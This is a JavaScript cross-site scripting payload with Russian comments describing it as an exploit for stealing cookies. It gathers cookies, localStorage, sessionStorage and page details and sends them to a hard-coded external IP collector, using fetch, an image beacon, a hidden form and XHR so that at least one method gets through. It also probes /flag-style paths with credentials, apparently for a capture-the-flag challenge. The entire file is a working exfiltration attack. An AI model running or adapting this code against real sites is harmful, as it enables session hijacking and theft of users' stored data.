// Эксплойт для кражи кук и отправки на ваш сервер
(function() {
    // Ваш сервер для сбора данных
    var COLLECTOR_URL = 'http://109.234.39.144:8889/';
    
    // Собираем все возможные данные
    var data = {
        // Куки страницы
        cookies: document.cookie,
        
        // URL страницы
        url: window.location.href,
        
        // User-Agent (может быть полезен)
        userAgent: navigator.userAgent,
        
        // Referrer
        referrer: document.referrer,
        
        // localStorage
        localStorage: null,
        
        // sessionStorage
        sessionStorage: null,
        
        // Таймстамп
        timestamp: new Date().toISOString()
    };
    
    // Пытаемся достать localStorage
    try {
        data.localStorage = JSON.stringify(localStorage);
    } catch(e) {
        data.localStorage = 'Error: ' + e.message;
    }
    
    // Пытаемся достать sessionStorage
    try {
        data.sessionStorage = JSON.stringify(sessionStorage);
    } catch(e) {
        data.sessionStorage = 'Error: ' + e.message;
    }
    
    // Функция отправки данных на ваш сервер
    function sendToServer(dataToSend) {
        // Метод 1: Отправка через fetch (если разрешено CORS)
        fetch(COLLECTOR_URL, {
            method: 'POST',
            mode: 'no-cors',  // Важно: no-cors может ограничить, но попробуем
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(dataToSend)
        }).catch(function(e) {
            console.log('Fetch failed:', e);
            // Если fetch заблокирован, пробуем другие методы
        });
        
        // Метод 2: Отправка через Image (всегда работает, даже при CORS)
        var img = new Image();
        img.src = COLLECTOR_URL + '?' + encodeURIComponent(JSON.stringify(dataToSend)).substring(0, 2000);
        
        // Метод 3: Отправка через создание формы
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = COLLECTOR_URL;
        form.style.display = 'none';
        
        var input = document.createElement('input');
        input.name = 'data';
        input.value = JSON.stringify(dataToSend);
        form.appendChild(input);
        
        document.body.appendChild(form);
        form.submit();
        
        // Удаляем форму через секунду
        setTimeout(function() {
            document.body.removeChild(form);
        }, 1000);
    }
    
    // Показываем на странице, что эксплойт сработал
    var panel = document.createElement('div');
    panel.style.cssText = 'position:fixed; bottom:0; left:0; background:red; color:white; padding:5px; font-size:12px; z-index:9999;';
    panel.innerHTML = '📡 Sending data to collector...';
    document.body.appendChild(panel);
    
    // Отправляем данные
    sendToServer(data);
    
    // Если куки не пустые, показываем их (для отладки)
    if (document.cookie) {
        panel.innerHTML = '🍪 Cookies found! Sending: ' + document.cookie.substring(0, 100);
    } else {
        panel.innerHTML = '⚠️ No cookies found!';
    }
    
    // Дополнительно: пробуем украсть флаг из других мест
    setTimeout(function() {
        // Пробуем fetch флага
        fetch('/flag', {credentials: 'include'})
            .then(function(r) { return r.text(); })
            .then(function(flag) {
                sendToServer({flag: flag, from: '/flag'});
                panel.innerHTML = '🏆 Flag from /flag: ' + flag.substring(0, 50);
            })
            .catch(function(e) {});
            
        fetch('/admin/flag', {credentials: 'include'})
            .then(function(r) { return r.text(); })
            .then(function(flag) {
                sendToServer({flag: flag, from: '/admin/flag'});
            })
            .catch(function(e) {});
            
        fetch('/flag.txt', {credentials: 'include'})
            .then(function(r) { return r.text(); })
            .then(function(flag) {
                sendToServer({flag: flag, from: '/flag.txt'});
            })
            .catch(function(e) {});
    }, 1000);
    
    // Также пробуем выполнить XHR запрос (старый способ)
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', COLLECTOR_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
    } catch(e) {}
})();